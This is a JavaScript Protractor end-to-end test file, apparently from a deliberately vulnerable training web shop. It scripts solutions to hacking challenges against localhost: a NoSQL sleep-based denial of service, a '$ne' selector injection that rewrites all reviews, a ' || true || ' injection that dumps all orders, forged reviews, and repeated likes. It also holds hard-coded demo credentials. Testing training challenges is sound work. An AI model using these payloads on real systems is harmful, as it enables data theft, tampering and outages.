const config = require('config')

describe('/rest/products/reviews', () => {
  beforeEach(() => {
    browser.get('/#/search')
  })

  describe('challenge "NoSql Command Injection"', () => {
    protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

    it('should be possible to inject a command into the get route', () => { // FIXME Fails after merging gsoc-frontend and -challenges
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            console.log('Success')
          }
        }
        xhttp.open('GET', 'http://localhost:3000/rest/products/sleep(1000)/reviews', true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()
      })
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL DoS' })
  })

  describe('challenge "NoSql Reviews Injection"', () => {
    it('should be possible to inject a selector into the update route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); } }; xhttp.open("PATCH","http://localhost:3000/rest/products/reviews", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization", `Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }));') // eslint-disable-line
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Manipulation' })
  })

  describe('challenge "NoSql Orders Injection"', () => {
    it('should be possible to inject and get all the orders', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            console.log('Success')
          }
        }
        xhttp.open('GET', 'http://localhost:3000/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27', true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()
      })
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Exfiltration' })
  })

  describe('challenge "Forged Review"', () => {
    protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })

    it('should be possible to edit any existing review', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            const reviewId = JSON.parse(this.responseText).data[0]._id
            editReview(reviewId)
          }
        }

        xhttp.open('GET', 'http://localhost:3000/rest/products/1/reviews', true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()

        function editReview (reviewId) {
          var xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('PATCH', 'http://localhost:3000/rest/products/reviews', true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send(JSON.stringify({ id: reviewId, message: 'injected' }))
        }
      })
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Forged Review' })
  })

  describe('challenge "Multiple Likes"', () => {
    protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })

    it('should be possible to like reviews multiple times', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            const reviewId = JSON.parse(this.responseText).data[0]._id
            sendPostRequest(reviewId)
            sendPostRequest(reviewId)
            sendPostRequest(reviewId)
          }
        }

        xhttp.open('GET', 'http://localhost:3000/rest/products/1/reviews', true)
        xhttp.setRequestHeader('Content-type', 'text/plain')
        xhttp.send()

        function sendPostRequest (reviewId) {
          var xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('POST', 'http://localhost:3000/rest/products/reviews', true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send(JSON.stringify({ id: reviewId }))
        }
      })
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })

    protractor.expect.challengeSolved({ challenge: 'Multiple Likes' })
  })
})
